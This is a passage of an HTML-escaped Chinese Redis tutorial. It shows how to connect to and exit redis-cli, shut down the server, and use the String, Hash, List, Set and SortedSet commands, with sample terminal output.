&lt;code class=&quot;hljs ruby&quot;&gt;[root@itheima bin]&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;192.168.25.153:6379&amp;gt;&lt;/span&gt; ping&lt;br/&gt;PONG&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;192.168.25.153:6379&amp;gt;&lt;/span&gt; &lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;　　-h：连接的服务器的地址&lt;br/&gt;　　-p：服务的端口号&lt;/p&gt;
&lt;h4 id=&quot;h333redisredis&quot;&gt;&lt;span&gt;&lt;strong&gt;3.3.3、使用redis的桌面程序连接redis&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;先安装：redis-desktop-manager-0.7.9.809.exe&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/11/19/5zSbZz.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;安装好后，双击打开软件&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/11/19/5zSpIS.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;redis默认有16个库，如果不指定库，默认存储在索引为0的库中。&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/11/19/5zSu9h.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;退出连接：&lt;br/&gt;第一种方式：
&lt;pre&gt;
&lt;code class=&quot;hljs ruby&quot;&gt;[root@itheima bin]&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;127.0.0.1:6379&amp;gt;&lt;/span&gt; quit&lt;br/&gt;[root@itheima bin]&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;第二种方式：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs ruby&quot;&gt;[root@itheima bin]&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;127.0.0.1:6379&amp;gt;&lt;/span&gt; exit&lt;br/&gt;[root@itheima bin]&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;第三种方式：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs&quot;&gt;Ctrl+C&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;h334redis&quot;&gt;&lt;span&gt;&lt;strong&gt;3.3.4、关闭redis服务&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;第一种：通过连接上客户端进行关闭，使用shutdown 命令。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs ruby&quot;&gt;[root@itheima bin]&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;127.0.0.1:6379&amp;gt;&lt;/span&gt; shutdown&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;not&lt;/span&gt; connected&amp;gt; &lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;第二种：使用 kill 命令。&lt;br/&gt;找到对应的redis的进程id 然后使用命令：(pid为进程id)&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs coffeescript&quot;&gt;[root@itheima bin]&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;h34redis&quot;&gt;&lt;span&gt;&lt;strong&gt;3.4、redis五种数据类型&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;h4 id=&quot;h341stringkeyvalue&quot;&gt;&lt;span&gt;&lt;strong&gt;3.4.1、String：key-value&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;redis命令不区分大小写，但是&lt;code&gt;key区分大小写&lt;/code&gt;的。&lt;br/&gt;redis中所有的数据都是&lt;code&gt;字符串&lt;/code&gt;。&lt;br/&gt;redis是&lt;code&gt;单线程&lt;/code&gt;的，所以不适合存储比较大的数据，最好要存小且能快速处理完的东西。&lt;br/&gt;使用&lt;code&gt;incr&lt;/code&gt;命令，如果key不存在，会自动创建key并自动+1。&lt;br/&gt;  set key value   设置值&lt;br/&gt;  get key   获取值&lt;br/&gt;  incr key   加一&lt;br/&gt;  decr key   减一&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs css&quot;&gt;127&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:6379&lt;/span&gt;&amp;gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;key1&lt;/span&gt; 2&lt;br/&gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;OK&lt;/span&gt;&lt;br/&gt;127&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:6379&lt;/span&gt;&amp;gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;key2&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;value2&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;OK&lt;/span&gt;&lt;br/&gt;127&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:6379&lt;/span&gt;&amp;gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;key1&lt;/span&gt;&lt;br/&gt;&quot;2&quot;&lt;br/&gt;127&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:6379&lt;/span&gt;&amp;gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;key2&lt;/span&gt;&lt;br/&gt;&quot;&lt;span class=&quot;hljs-selector-tag&quot;&gt;value2&lt;/span&gt;&quot;&lt;br/&gt;127&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:6379&lt;/span&gt;&amp;gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;Get&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;key2&lt;/span&gt;&lt;br/&gt;&quot;&lt;span class=&quot;hljs-selector-tag&quot;&gt;value2&lt;/span&gt;&quot;&lt;br/&gt;127&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:6379&lt;/span&gt;&amp;gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;incr&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;key1&lt;/span&gt;&lt;br/&gt;(&lt;span class=&quot;hljs-selector-tag&quot;&gt;integer&lt;/span&gt;) 3&lt;br/&gt;127&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:6379&lt;/span&gt;&amp;gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;decr&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;key1&lt;/span&gt;&lt;br/&gt;(&lt;span class=&quot;hljs-selector-tag&quot;&gt;integer&lt;/span&gt;) 2&lt;br/&gt;127&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:6379&lt;/span&gt;&amp;gt; &lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;h342hashkeyfieldvalue&quot;&gt;&lt;span&gt;&lt;strong&gt;3.4.2、Hash: key-field-value&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;相当于一个key对应一个map (map中又是key-value)，&lt;/code&gt;一般应用于归类。&lt;br/&gt;  hset key field value&lt;br/&gt;  hget key field&lt;br/&gt;  hincrby key field num&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs css&quot;&gt;127&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:6379&lt;/span&gt;&amp;gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;hset&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;hkey1&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;filed1&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;value1&lt;/span&gt;&lt;br/&gt;(&lt;span class=&quot;hljs-selector-tag&quot;&gt;integer&lt;/span&gt;) 1&lt;br/&gt;127&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:6379&lt;/span&gt;&amp;gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;hset&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;hkey1&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;filed2&lt;/span&gt; 2&lt;br/&gt;(&lt;span class=&quot;hljs-selector-tag&quot;&gt;integer&lt;/span&gt;) 1&lt;br/&gt;127&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:6379&lt;/span&gt;&amp;gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;hget&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;hkey1&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;filed1&lt;/span&gt;&lt;br/&gt;&quot;&lt;span class=&quot;hljs-selector-tag&quot;&gt;value1&lt;/span&gt;&quot;&lt;br/&gt;127&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:6379&lt;/span&gt;&amp;gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;hget&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;hkey1&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;filed2&lt;/span&gt;&lt;br/&gt;&quot;2&quot;&lt;br/&gt;127&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:6379&lt;/span&gt;&amp;gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;hincrby&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;hkey1&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;filed2&lt;/span&gt; 1&lt;br/&gt;(&lt;span class=&quot;hljs-selector-tag&quot;&gt;integer&lt;/span&gt;) 3&lt;br/&gt;127&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:6379&lt;/span&gt;&amp;gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;hincrby&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;hkey1&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;filed2&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;-1&lt;/span&gt;&lt;br/&gt;(&lt;span class=&quot;hljs-selector-tag&quot;&gt;integer&lt;/span&gt;) 2&lt;br/&gt;127&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:6379&lt;/span&gt;&amp;gt; &lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;h343list&quot;&gt;&lt;span&gt;&lt;strong&gt;3.4.3、List&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;List是有顺序可重复(数据结构中的：双链表，队列)&lt;/code&gt;。&lt;br/&gt;可作为链表，可以从左添加元素，也可以从右添加元素。&lt;br/&gt;  lpush list a b c d   (从左添加元素)&lt;br/&gt;  rpush list 1 2 3 4   (从右边添加元素)&lt;br/&gt;  lrange list 0 -1   (从 0 到 -1 元素查看：也就表示查看所有)&lt;br/&gt;  lpop list   (从左边取，删除)&lt;br/&gt;  rpop list   (从右边取，删除)&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs ruby&quot;&gt;&lt;span class=&quot;hljs-meta&quot;&gt;127.0.0.1:6379&amp;gt;&lt;/span&gt; lpush list1 a b c d&lt;br/&gt;(integer) &lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;127.0.0.1:6379&amp;gt;&lt;/span&gt; lrange list1 &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt; -&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;d&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;c&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;b&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;127.0.0.1:6379&amp;gt;&lt;/span&gt; rpush list1 &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt;&lt;br/&gt;(integer) &lt;span class=&quot;hljs-number&quot;&gt;8&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;127.0.0.1:6379&amp;gt;&lt;/span&gt; lrange list1 &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt; -&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;d&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;c&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;b&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;6&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;2&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;7&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;3&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;8&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;4&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;127.0.0.1:6379&amp;gt;&lt;/span&gt; lpop list1&lt;br/&gt;&lt;span class=&quot;hljs-string&quot;&gt;&quot;d&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;127.0.0.1:6379&amp;gt;&lt;/span&gt; lrange list1 &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt; -&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;c&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;b&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;2&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;6&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;3&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;7&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;4&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;127.0.0.1:6379&amp;gt;&lt;/span&gt; rpop list1&lt;br/&gt;&lt;span class=&quot;hljs-string&quot;&gt;&quot;4&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;127.0.0.1:6379&amp;gt;&lt;/span&gt; lrange list1 &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt; -&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;c&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;b&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;2&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;6&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;3&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;127.0.0.1:6379&amp;gt;&lt;/span&gt; &lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;h344set&quot;&gt;&lt;span&gt;&lt;strong&gt;3.4.4、Set&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;Set无顺序，不能重复。&lt;/code&gt;&lt;br/&gt;  sadd set1 a b c d d   (向set1中添加元素)元素不重复&lt;br/&gt;  smembers set1   (查询元素)&lt;br/&gt;  srem set1 a   (删除元素)&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs css&quot;&gt;127&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:6379&lt;/span&gt;&amp;gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;sadd&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;set1&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;c&lt;/span&gt;&lt;br/&gt;(&lt;span class=&quot;hljs-selector-tag&quot;&gt;integer&lt;/span&gt;) 3&lt;br/&gt;127&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:6379&lt;/span&gt;&amp;gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;smembers&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;set1&lt;/span&gt;&lt;br/&gt;1) &quot;&lt;span class=&quot;hljs-selector-tag&quot;&gt;c&lt;/span&gt;&quot;&lt;br/&gt;2) &quot;&lt;span class=&quot;hljs-selector-tag&quot;&gt;b&lt;/span&gt;&quot;&lt;br/&gt;3) &quot;&lt;span class=&quot;hljs-selector-tag&quot;&gt;a&lt;/span&gt;&quot;&lt;br/&gt;127&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:6379&lt;/span&gt;&amp;gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;srem&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;set1&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;a&lt;/span&gt;&lt;br/&gt;(&lt;span class=&quot;hljs-selector-tag&quot;&gt;integer&lt;/span&gt;) 1&lt;br/&gt;127&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:6379&lt;/span&gt;&amp;gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;smembers&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;set1&lt;/span&gt;&lt;br/&gt;1) &quot;&lt;span class=&quot;hljs-selector-tag&quot;&gt;c&lt;/span&gt;&quot;&lt;br/&gt;2) &quot;&lt;span class=&quot;hljs-selector-tag&quot;&gt;b&lt;/span&gt;&quot;&lt;br/&gt;127&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:6379&lt;/span&gt;&amp;gt; &lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;h345sortedsetzset&quot;&gt;&lt;span&gt;&lt;strong&gt;3.4.5、SortedSet（zset）&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;SortedSet有顺序，不能重复。&lt;/code&gt;&lt;br/&gt;适合做排行榜 排序需要一个分数属性。&lt;br/&gt;  zadd zset1 8 a 4 b 5 c 1 d   (添加元素：zadd key score member)&lt;br/&gt;  zrange key start stop [WITHSCORES]   (查看所有元素：zrange key 0 -1 withscores)&lt;br/&gt;    如果要查看分数，需要加上withscores&lt;br/&gt;  zrange zset1 0 -1   (从小到大)&lt;br/&gt;  zrevrange zset1 0 -1   (从大到小)&lt;br/&gt;  zincrby zset1 score member   (对元素 member 增加 score)&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs ruby&quot;&gt;&lt;span class=&quot;hljs-meta&quot;&gt;127.0.0.1:6379&amp;gt;&lt;/span&gt; zadd zset1 &lt;span class=&quot;hljs-number&quot;&gt;8&lt;/span&gt; a &lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt; b &lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt; c &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt; d&lt;br/&gt;(integer) &lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;127.0.0.1:6379&amp;gt;&lt;/span&gt; zrange zset1 &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt; -&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;d&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;b&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;c&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;127.0.0.1:6379&amp;gt;&lt;/span&gt; zadd zset1 &lt;span class=&quot;hljs-number&quot;&gt;9&lt;/span&gt; a&lt;br/&gt;(integer) &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;127.0.0.1:6379&amp;gt;&lt;/span&gt; zrange zset1 &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt; -&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;d&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;b&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;) &lt;span class=&quot;hljs-string&quot;&gt;&quot;c&quot;&lt;/span&gt;&lt;br/&gt;&lt;span 